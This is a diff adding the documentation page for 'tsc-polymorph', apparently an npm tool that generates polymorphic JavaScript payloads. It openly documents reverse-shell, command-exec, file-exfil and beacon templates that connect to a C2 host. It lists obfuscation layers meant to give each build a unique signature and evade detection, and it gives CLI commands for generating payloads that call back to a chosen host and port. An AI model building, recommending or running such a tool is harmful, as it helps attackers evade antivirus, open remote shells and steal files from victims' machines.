@@ -1,0 +1,93 @@
+---
+title: tsc-polymorph — Polymorphic Payload Generator
+description: Generate unique-signature payloads with AES encryption, XOR obfuscation, dead code insertion, and runtime decryption
+---
+
+# tsc-polymorph
+
+Polymorphic payload generator — every build produces a unique binary signature. AES-256-CBC + XOR + dead code + control flow obfuscation.
+
+## Installation
+
+```bash
+npm install -g tsc-polymorph
+```
+
+## Quick Start
+
+### Generate a payload
+
+```bash
+tsc-polymorph generate --host 192.168.1.1 --port 4443 --output payload.js
+```
+
+### Generate 10 unique payloads
+
+```bash
+tsc-polymorph batch --count 10 --host example.com --output-dir ./payloads/
+```
+
+### Analyze a payload
+
+```bash
+tsc-polymorph info payload.js
+```
+
+### Compare two payloads
+
+```bash
+tsc-polymorph compare payload1.js payload2.js
+```
+
+## Obfuscation Layers
+
+Every generated payload passes through all layers:
+
+```
+Source Template
+    │
+    ├── AES-256-CBC encryption (per-generation random key)
+    ├── XOR pass (additional layer)
+    ├── Base64 encoding
+    │
+    ├── Dead code insertion (random vars, loops, functions)
+    ├── Variable renaming (random _0x + hex names)
+    ├── String obfuscation (hex + base64 with runtime decoder)
+    ├── Operation substitution (a+b → a-(-b))
+    └── Control flow flattening (if/else → switch dispatch)
+```
+
+## Payload Templates
+
+| Template | Description |
+|----------|-------------|
+| `reverse-shell` | TCP connect back, read commands, execute, send output |
+| `command-exec` | Execute a pre-configured command and exfiltrate |
+| `file-exfil` | Read a file and send it to C2 |
+| `beacon` | HTTPS beacon with configurable interval |
+| `auto` | Picks best template based on protocol |
+
+## CLI Reference
+
+### `tsc-polymorph generate`
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--host` | *required* | C2 server address |
+| `--port` | `4443` | C2 server port |
+| `--protocol` | `tcp` | `tcp` or `https` |
+| `--beacon` | `60` | Beacon interval (seconds) |
+| `--template` | `auto` | Payload template type |
+| `--output` | `payload.js` | Output file |
+
+### `tsc-polymorph batch`
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--count` | `10` | Number of payloads |
+| `--host` | *required* | C2 server address |
+| `--output-dir` | `./payloads/` | Output directory |
+
+## License
+
+GPL-3.0
